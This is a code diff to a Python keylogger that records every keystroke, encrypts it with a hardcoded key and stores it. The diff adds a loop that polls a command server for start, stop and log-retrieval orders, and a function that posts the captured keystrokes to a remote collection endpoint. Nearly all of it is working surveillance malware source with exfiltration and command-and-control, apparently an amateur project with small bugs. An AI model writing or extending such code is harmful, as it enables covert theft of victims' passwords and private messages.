@@ -8,37 +8,53 @@ import json
 from flask import Flask, request, jsonify
 import requests
 
-app = Flask(__name__)
+#
+# app = Flask(__name__)
+URL = "http://127.0.0.1:5000/receive_logs"
 
 ENCRYPTED_LOG_FILE = "encrypted_logs.json"
 ENCRYPTION_KEY = "613".encode('utf-8')
 
 
-@app.route('/get_logs', methods=['GET'])
-def get_logs():
-    logs_data = JSONFileHandler.read_logs()
-    return jsonify(logs_data), 200
+#
+# @app.route('/get_logs', methods=['GET'])
+# def get_logs():
+#     logs_data = JSONFileHandler.read_logs()
+#     return jsonify(logs_data), 200
+#
+#
+# @app.route('/start', methods=['GET'])
+# def start():
+#     Manager().start_logging()
+#     return "KeyLogger started listening", 200
+#
+#
+# @app.route('/route', methods=['GET'])
+# def route():
+#     x = Manager()
+#     x.routing_to_server()
+#     x.start_logging()
+#     return "KeyLogger started listening", 200
+#
+#
+# @app.route('/stop', methods=['GET'])
+# def stop():
+#     Manager().stop_logging()
+#     return "KeyLogger stopped listening", 200
+#
+#
+# @app.route('/time_to_run/<value>', methods=['GET'])
+# def time_to_run(value):
+#     if int(value) > 0:
+#         Manager().run_time(int(value))
+#         return f"KeyLogger started listening for {value} minutes", 200
+#     else:
+#         return "No runtime received.", 200
 
 
-@app.route('/start', methods=['GET'])
-def start():
-    Manager().start_logging()
-    return "KeyLogger started listening", 200
-
-
-@app.route('/stop', methods=['GET'])
-def stop():
-    Manager().stop_logging()
-    return "KeyLogger stopped listening", 200
-
-
-@app.route('/time_to_run/<value>', methods=['GET'])
-def time_to_run(value):
-    if int(value) > 0:
-        Manager().run_time(int(value))
-        return f"KeyLogger started listening for {value} minutes", 200
-    else:
-        return "No runtime received.", 200
+def send_logs(data):
+    response = requests.post(URL, json=data, headers={"Content-Type": "applicetion/json"})
+    print(f"Response: {response.status_code}, {response.text}")
 
 
 class JSONFileHandler:
@@ -63,8 +79,8 @@ class JSONFileHandler:
 
 
 class KeyLogger:
-    def __init__(self, routing: str = 'file'):
-        self.routing = routing
+    def __init__(self):
+        self.routing = 'file'
         self.current_keys = []
         self.lock = threading.Lock()
         self.listener = keyboard.Listener(on_press=self.on_press)
@@ -107,38 +123,14 @@ class KeyLogger:
             keys_copy = self.current_keys.copy()
             self.current_keys.clear()
         keys_str = ''.join(keys_copy)
-        Manager.encrypt(keys_str)
-        # save for letter
-        # if keys_copy:
-        #     if self.routing == 'file':
-        #         Writer().add_writing(keys_copy)
-        #     elif self.routing == 'server':
-        #         Writer().write_to_server()
+        Manager.encrypt(keys_str, self.routing)
 
     def stop_listen(self):
         self.listener.stop()
         self.stop_event = True
 
-    def routing_to_save(self, route):
-        if route == 'server':
-            self.routing = route
-
-
-#
-# class FileWriter:
-#     @classmethod
-#     def add_writing(cls, encrypted_content: str):
-#         log_time = datetime.now().strftime("%d/%m/%Y %H:%M")
-#         with open(ENCRYPTED_LOG_FILE, "a", encoding="utf-8") as f:
-#             f.write(f"[{log_time}] {encrypted_content}\n")
-#
-#     @classmethod
-#     def write_to_server(cls):
-#         pass
-#
-#     @classmethod
-#     def read(cls):
-#         with open(ENCRYPTED_LOG_FILE,'br',)
+    # def routing_to_save(self, route):
+    #     self.routing = "server"
 
 
 class EncryptorDecryptor:
@@ -168,15 +160,15 @@ class Manager:
         self.threading_start = threading.Thread(target=self.thread_start_logging)
         self.threading_run_time = None
 
-    def stop_logging(self):
-        self.key_logger.stop_listen()
-
     def start_logging(self):
         if not self.threading_start.is_alive():
             self.threading_start.start()
 
     def thread_start_logging(self):
         self.key_logger.start()  # returns on a
+
+    def stop_logging(self):
+        self.key_logger.stop_listen()
 
     def run_time(self, timer: int):
         self.threading_run_time = threading.Thread(target=self.thread_run_time, args=(timer,))
@@ -185,10 +177,20 @@ class Manager:
     def thread_run_time(self, timer: int):
         self.key_logger.start(timer)
 
+    def set_routing(self, routing_type: str):
+        if routing_type in ['file', 'server']:
+            self.key_logger.routing = routing_type
+        else:
+            pass
+        self.key_logger.routing_to_save(routing_type)
+
     @staticmethod
-    def encrypt(data: str):
+    def encrypt(data: str, route):
         encrypted_data = EncryptorDecryptor.encrypt(data)
-        JSONFileHandler.write_log(encrypted_data)
+        if route == 'file':
+            JSONFileHandler.write_log(encrypted_data)
+        else:
+            send_logs(encrypted_data)
 
     @staticmethod
     def decrypt_log_file():
@@ -197,16 +199,46 @@ class Manager:
             decrypted = EncryptorDecryptor.decrypt(log["encrypted_content"])
             print(f"{log['timestamp']} {decrypted}")
 
-    def route(self, routing='file'):
-        self.key_logger.routing_to_save(routing)
+
+def check_for_commands():
+    """בודק כל 10 שניות אם יש הוראות חדשות מהשרת."""
+    while True:
+        try:
+            response = requests.get(f"http://127.0.0.1:5000/get_commands")
+            print("+++")
+            if response.status_code == 200:
+                commands = response.json().get("commands", [])
+                for command in commands:
+                    handle_command(command)
+        except Exception as e:
+            print(f"Error checking for commands: {e}")
+        time.sleep(10)
+
+
+def handle_command(command):
+    """מטפל בהוראות מהשרת."""
+    action = command.get("action")
+    if action == "start":
+        manager.start_logging()
+    elif action == "stop":
+        manager.stop_logging()
+    elif action == "set_routing":
+        routing_type = command.get("routing")
+    elif action == "get_logs":
+        logs_data = JSONFileHandler.read_logs()
+        send_logs(jsonify(logs_data))
 
 
 if __name__ == '__main__':
-    Manager.decrypt_log_file()
-    app.run(host='0.0.0.0', port=5000)
+    manager = Manager()
+    threading.Thread(target=check_for_commands, daemon=True).start()
+    while True:
+        time.sleep(1)
+    # manager.decrypt_log_file()
+    # app.run(host='0.0.0.0', port=5000)
 
     # m = Manager()
     # m.run_time(1)
 
     # m.stop()
-    Manager.decrypt_log_file()
+    # Manager.decrypt_log_file()
